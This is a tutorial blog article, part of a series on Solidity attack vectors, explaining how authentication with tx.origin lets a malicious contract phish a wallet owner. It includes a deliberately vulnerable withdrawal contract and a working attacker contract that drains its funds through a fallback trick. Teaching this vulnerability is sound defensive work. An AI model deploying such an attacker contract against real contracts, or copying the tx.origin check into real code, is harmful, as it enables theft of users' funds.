# Solidity Attack Vectors: #3 - Phishing With "tx.origin"

Welcome to the third attack vector in my series on Solidity Attack Vectors. In my previous article, I discussed how contracts with zero code size can be used as an attack vector and mentioned the use of "tx.origin" in preventing such attacks. In this article, I will introduce "tx.origin" and how it can also be used maliciously. Let's get started!

## What is "tx.origin" and where does it come from?

First, let's discuss the origin of "tx.origin" and what it is. In Solidity, there are different types of variables, including state variables (defined outside a function), local variables (defined inside a function), and global variables, which are native to Solidity and the blockchain (e.g., Ethereum, Polygon, Arbritrium). Some examples of global variables include "msg.sender", "msg.data", "block.timestamp", and "tx.origin".

Now that we know where "tx.origin" comes from, what does it mean or do? "tx.origin" is a global variable in Solidity that holds the address of the EOA (externally owned account, or simply the user's wallet address) from which a transaction originated. Every transaction in the Ethereum blockchain originates from an EOA, no matter where the transaction ends, but one transaction can lead to further transactions.

For instance, an EOA owned by "Jane" may send a transaction to contract "A", which then makes another transaction to contract "B". To contract "B", contract "A" is the "msg.sender", but "Jane" is the "tx.origin", since the first transaction that led to the second was initiated by her. This is applicable to all transactions, no matter the transaction call chain depth.

## How "tx.origin" is used as an attack vector in solidity

It is similar to "msg.sender", which holds only the address of the current transaction initiator. It is commonly used in smart contracts to determine who is calling the contract's functions or to perform actions on behalf of the transaction initiator

"Tx.origin" can be useful in certain cases, but it can also be a vulnerability for attacks.

Consider the following code:

```solidity
pragma solidity ^0.8.0;

contract TxOriginVulnerable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {}

    //...................other lines of code

    //withdraw all ether from the contract
     function Withdraw() public {
        require(tx.origin == owner, "Not owner");
        msg.sender.call{value: address(this).balance}("");
    }
}
```

Imagine that the above contract has millions of ETH inside and we want only the owner of the contract to be able to withdraw the ETH. We are careful to check that the person calling the "Withdraw" function is the "owner" and no one else. However, we also decide to use "tx.origin" for this, forgetting that it represents the address from which the transaction originated.

Now, "John" is a malicious actor who is monitoring our contract. Having seen how we used "tx.origin" for authentication, "John" decides to write a malicious contract to exploit our contract. Here is the code of the malicious contract:

```solidity
pragma solidity ^0.8.0;
contract txOriginAttacker {
    address public attacker;
    TxOriginVulnerable txOriginVulnerable;

    constructor(TxOriginVulnerable _txOriginVulnerable) {
        txOriginVulnerable = TxOriginVulnerable(_txOriginVulnerable);
        attacker = msg.sender;
    }

    fallback() external payable {
        Attack();
    }

    //...................other lines of code

    //withdraw all ether from the contract
    function Attack() internal {
        txOriginVulnerable.Withdraw();
    }

    function withdrawStolenFunds() public {
        payable(attacker).transfer(address(this).balance);
    }
}
```

"John" has created a malicious contract that calls the "Withdraw" function of the vulnerable contract. he tricks "Jane" into sending some ETH to the malicious contract, which then triggers the "fallback" function of the malicious contract, which in turn calls its "Attack" function. Since the malicious contract's "Attack" function is calling the "Withdraw" function of the vulnerable contract, "msg.sender" in the vulnerable contract will be the address of the malicious contract. However, "tx.origin" in the vulnerable contract will still be the address of the user who initiated the first transaction (sending ETH), in this case "Jane", the owner of the vulnerable contract.

As a result, the "require" statement in the "Withdraw" function of the vulnerable contract will be satisfied, since "tx.origin" is equal to "owner". The malicious contract will be able to successfully call the "Withdraw" function and transfer all the ETH in the vulnerable contract to its own account, effectively stealing all the funds.

This is just one example of how "tx.origin" can be used as an attack vector in Solidity. It is important to be aware of this vulnerability and use other methods of authentication, such as "msg.sender", when necessary. Always consider the potential security risks when using global variables in your contracts.

See you in the next article!
